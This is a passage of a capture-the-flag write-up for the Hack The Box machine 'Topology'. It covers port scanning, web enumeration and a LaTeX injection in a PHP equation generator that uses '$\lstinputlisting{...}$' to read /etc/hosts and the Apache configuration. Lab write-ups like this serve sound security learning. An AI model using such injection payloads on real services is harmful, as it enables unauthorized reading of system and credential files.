<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
        <meta name="author" content="Matthieu Mezirard">
    
    <meta name="author" content="Matthieu Mezirard" />
    
        <meta name="description" content="This is an easy Linux box.">
    
    <title>
        
            
        
        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;topology#
    </title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="/main.css" />
    <link
        id="theme-light-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/light.css"
    />
    <link
        id="theme-dark-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/dark.css"
    />
    <script
        async
        src="https://eu.umami.is/script.js"
        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
    ></script>
    <script src="/js/theme-toggle.js"></script>
    <script src="/js/code-wrapper.js"></script>
    <script src="/js/code-indicator.js"></script>
</head>


    <body>
        <header>
    <div class="left">
        <a href="/">
    mmezirard
</a>

        <div class="socials">
    
        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/github.svg" alt="github" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/hackerone.svg" alt="hackerone" />
        </a>
    
</div>

    </div>
    <div class="right">
        <nav>
    <ul>
        
            <li>
                <a href="&#x2F;htb-write-ups">
                    &#x2F;htb-write-ups
                </a>
            </li>
        
    </ul>
</nav>

        <button onclick="toggleTheme()">
    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
</button>
<script src="/js/theme-toggle.js"></script>

    </div>
</header>

        
    <main>
        
<article>
    <div>
        
    
        <div class="page-h1">
            Topology<span>.</span>
        </div>
    


        <div class="page-metadata">
            
                Posted on <time>2024-03-16</time>
            
        </div>

        
            <img
                class="page-cover"
                alt="cover.png"
                src="https://mmezirard.github.io/htb-write-ups/boxes/topology/cover.png"
            />
        
    </div>

    
        <h1>Table of Contents</h1>
        <ul>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#information">Information</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#setup">Setup</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#host-10-10-11-217">Host 10.10.11.217</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#scanning">Scanning</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#ports">Ports</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#fingerprinting">Fingerprinting</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#scripts">Scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#services-enumeration">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#apache">Apache</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#foothold-ssh">Foothold (SSH)</a>
                                </li>

                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#getting-a-lay-of-the-land">Getting a lay of the land</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#architecture">Architecture</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#distribution">Distribution</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#kernel">Kernel</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#users">Users</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#groups">Groups</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#nics">NICs</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#hostname">Hostname</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#system-enumeration">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#flags">Flags</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#exploring-opt">Exploring &#x2F;opt</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#privilege-escalation-cronjob">Privilege escalation (Cronjob)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#preparation">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#exploitation">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#establishing-persistence">Establishing persistence</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#system-enumeration-1">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#flags-1">Flags</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#afterwords">Afterwords</a>
                    
                </li>
            
        </ul>
    

    <section><h1 id="information">Information</h1>
<p><strong>Difficulty</strong>: Easy</p>
<p><strong>OS</strong>: Linux</p>
<p><strong>Release date</strong>: 2023-06-10</p>
<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/22016">gedsic</a></p>
<h1 id="setup">Setup</h1>
<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
<p>I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:</p>
<ol>
<li>
<p>I'll create a directory that will contain every file related to this box.
I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
<code>/</code>.</p>
</li>
<li>
<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
files in this folder available over the Internet, which will be especially
useful for transferring files to the target machine if need be!</p>
</li>
<li>
<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
This will come in handy once we get a foothold, for privilege escalation and
for pivoting inside the internal network.</p>
</li>
</ol>
<p>I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.</p>
<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.2</code>. The
commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
<p>Now we should be ready to go!</p>
<h1 id="host-10-10-11-217">Host <code>10.10.11.217</code></h1>
<h2 id="scanning">Scanning</h2>
<h3 id="ports">Ports</h3>
<p>As usual, let's start by initiating a port scan on Topology using a TCP SYN
<code>nmap</code> scan to assess its attack surface.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also check the 500 most common UDP ports.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h3 id="fingerprinting">Fingerprinting</h3>
<p>Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Alright, so <code>nmap</code> managed to determine that Topology is running Linux, and the
version of SSH suggests that it might be Ubuntu.</p>
<h3 id="scripts">Scripts</h3>
<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
additional information.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">| ssh-hostkey: 
</span><span class="z-text z-plain">|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
</span><span class="z-text z-plain">|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
</span><span class="z-text z-plain">|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">|_http-title: Miskatonic University | Topology Group
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h2 id="services-enumeration">Services enumeration</h2>
<h3 id="apache">Apache</h3>
<h4 id="exploration">Exploration</h4>
<p>Let's browse to <code>http://10.10.11.217/</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/apache-homepage.png" alt="Apache homepage" /></p>
<p>It's a website for a university group named 'Topology' of the Department of
Mathematics. This page shows the group members, projects and publications.</p>
<h4 id="fingerprinting-1">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
<h4 id="exploration-1">Exploration</h4>
<p>One of the projects is 'LaTeX Equation Generator', and is used to create PNG
images of LaTeX equations in the browser. The link to access it redirects to
<code>http://latex.topology.htb/equation.php</code>.</p>
<p>I'll add this domain and subdomain to my <code>/etc/hosts</code> file.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217 topology.htb latex.topology.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll start by exploring the subdomain we just discovered:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-homepage.png" alt="Latex subdomain homepage" /></p>
<p>It's actually a directory listing.</p>
<h4 id="fingerprinting-2">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-homepage-wappalyzer.png" alt="Latex subdomain homepage Wappalyzer extension" /></p>
<p>This reveals that this web page is using PHP.</p>
<h4 id="exploration-2">Exploration</h4>
<p>It links the <code>equation.php</code> we're yet to
explore, but also a <code>header.tex</code> file:</p>
<pre data-lang="tex" class="language-tex z-code"><code class="language-tex" data-lang="tex"><span class="z-text z-tex z-latex"><span class="z-comment z-line z-percentage z-tex">% vdaisley&#39;s default latex header for beautiful documents
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-group z-bracket z-latex"><span class="z-punctuation z-definition z-group z-bracket z-begin z-latex">[</span>utf8<span class="z-punctuation z-definition z-group z-bracket z-end z-latex">]</span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">inputenc</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% set input encoding
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">graphicx</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% for graphic files
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">eurosym</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% euro currency symbol
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">times</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% set nice font, tex default font is not my style
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">listings</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% include source code files or print inline code
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">hyperref</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% for clickable links in pdfs
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">mathtools</span>,amssymb,amsthm<span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% more default math packages
</span></span><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>usepackage</span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-usepackage z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">mathptmx</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span> <span class="z-comment z-line z-percentage z-tex">% math mode with times font
</span></span></code></pre>
<p>We also find <code>equationtest.tex</code>:</p>
<pre data-lang="tex" class="language-tex z-code"><code class="language-tex" data-lang="tex"><span class="z-text z-tex z-latex"><span class="z-meta z-preamble z-documentclass z-latex"><span class="z-keyword z-control z-preamble z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>documentclass</span><span class="z-meta z-preamble z-documentclass z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span></span></span></span><span class="z-meta z-preamble z-documentclass z-latex"><span class="z-meta z-group z-brace z-latex"><span class="z-support z-class z-latex">s</span><span class="z-support z-class z-latex">t</span><span class="z-support z-class z-latex">a</span><span class="z-support z-class z-latex">n</span><span class="z-support z-class z-latex">d</span><span class="z-support z-class z-latex">a</span><span class="z-support z-class z-latex">l</span><span class="z-support z-class z-latex">o</span><span class="z-support z-class z-latex">n</span><span class="z-support z-class z-latex">e</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span></span>
</span><span class="z-text z-tex z-latex"><span class="z-meta z-function z-input z-tex"><span class="z-keyword z-control z-input z-tex"><span class="z-punctuation z-definition z-backslash z-tex">\</span>input</span></span><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span>header<span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span>
</span><span class="z-text z-tex z-latex"><span class="z-support z-function z-begin z-latex"><span class="z-keyword z-control z-flow z-begin z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>begin</span></span><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span><span class="z-variable z-parameter z-function z-latex">document</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span>
</span><span class="z-text z-tex z-latex">
</span><span class="z-text z-tex z-latex"><span class="z-meta z-environment z-math z-inline z-dollar z-latex"><span class="z-string z-other z-math z-latex"><span class="z-punctuation z-definition z-string z-begin z-latex">$</span></span> <span class="z-support z-function z-math z-tex"><span class="z-punctuation z-definition z-backslash z-tex">\</span>int</span><span class="z-keyword z-operator z-math z-tex">_</span><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span><span class="z-variable z-other z-math z-tex">a</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span><span class="z-keyword z-operator z-math z-tex">^</span><span class="z-variable z-other z-math z-tex">b</span><span class="z-support z-function z-math z-tex"><span class="z-punctuation z-definition z-backslash z-tex">\</span>int</span><span class="z-keyword z-operator z-math z-tex">_</span><span class="z-meta z-group z-brace z-latex"><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span><span class="z-variable z-other z-math z-tex">c</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span></span><span class="z-keyword z-operator z-math z-tex">^</span><span class="z-variable z-other z-math z-tex">d</span> <span class="z-variable z-other z-math z-tex">f</span><span class="z-constant z-character z-parenthesis z-tex">(</span><span class="z-variable z-other z-math z-tex">x</span>,<span class="z-variable z-other z-math z-tex">y</span><span class="z-constant z-character z-parenthesis z-tex">)</span><span class="z-variable z-other z-math z-tex">dxdy</span> <span class="z-string z-other z-math z-latex"><span class="z-punctuation z-definition z-string z-end z-latex">$</span></span></span>
</span><span class="z-text z-tex z-latex">
</span><span class="z-text z-tex z-latex"><span class="z-support z-function z-end z-latex"><span class="z-keyword z-control z-flow z-end z-latex"><span class="z-punctuation z-definition z-backslash z-latex">\</span>end</span></span><span class="z-punctuation z-definition z-group z-brace z-begin z-latex">{</span><span class="z-variable z-parameter z-function z-latex">document</span><span class="z-punctuation z-definition z-group z-brace z-end z-latex">}</span>
</span></code></pre>
<p>Time to browse to the <code>equation.php</code> file:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-page.png" alt="Latex subdomain equation page" /></p>
<p>It's indeed a web page to convert LaTeX equations to PNG images.</p>
<p>If we enter a LaTeX equation and press 'Generate', it's rendered as LaTeX:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-set-image.png" alt="Latex subdomain equation set image" /></p>
<p>And if we enter some text, it's also rendered as LaTeX:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-text-image.png" alt="Latex subdomain equation text image" /></p>
<p>It also works for a few special characters.</p>
<h4 id="under-the-hood">Under the hood</h4>
<p>If we check the source code of the web page, we notice that when we press the
'Generate' button to submit the form, a GET message is sent to <code>/equation.php</code>
with the data:</p>
<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">eqn=<span class="z-meta z-tag z-inline z-form z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-inline z-form z-html">INPUT</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>&amp;submit=
</span></code></pre>
<p>It's likely inserting our input in a .TEX file like the <code>equationtest.tex</code> file
we found earlier, meaning that it imports the <code>header.tex</code> file and inserts our
input between <code>$</code> characters, used for inline math.</p>
<h4 id="latex-command-injection">LaTeX command injection</h4>
<p>Since our input is added to a .TEX file, and then somehow converted to an image,
we must be able to inject our own commands into the code.</p>
<p>If we search online for LaTeX injection, we find a page on
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">PayloadAllTheThings</a>.</p>
<p>Let's try to read the <code>/etc/hosts</code> file using the first payload,
<code>\input{/etc/hosts}</code>:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-lfi-illegal-command.png" alt="Latex subdomain equation lfi illegal command" /></p>
<p>This command is blocked.</p>
<p>We discovered <a href="https://mmezirard.github.io/htb-write-ups/boxes/topology/#under-the-hood">previously</a> that the <code>header.tex</code> file was
included in the file containing our input, and this .TEX file uses the
<code>listings</code> package. This means that we should be able to use
<code>\lstinputlisting{/etc/hosts}</code>!</p>
<p>However, if we try it, we get an error message indicating that the generated
image contains errors. In fact, if we go back to the <code>equationtest.tex</code> file, we
see that our input is placed between <code>$</code> characters, so we should enclose our
command between these characters to leave the inline math mode.</p>
<p>Hence, our LaTeX command injection to read <code>/etc/hosts</code> should be
<code>$\lstinputlisting{/etc/hosts}$</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-lfi-hosts-file.png" alt="Latex subdomain equation lfi /etc/hosts" /></p>
<p>And it works!</p>
<p>I also attempted to write to files, but everything I tried is blocked.</p>
<p>Now we got a LFI, but we can't do much with it, since we don't know which file
to read.</p>
<p>Let's read the default Apache configuration file, located at
<code>/etc/apache2/sites-enabled/000-default.conf</code>, using our LFI. Maybe it contains
critical information?</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-lfi-apache-default-configuration.png" alt="Latex subdomain equation lfi /etc/apache2/sites-enabled/000-default.conf" /></p>
<p>This configuration file reveals the existence of the <code>stats</code> and <code>dev</code>
subdomains.</p>
<p>I'll add these to my <code>/etc/hosts</code> file.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.217 stats.topology.htb dev.topology.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<h4 id="exploration-3">Exploration</h4>
<p>Let's start by exploring the <code>stats.topology.htb</code> subdomain:</p>
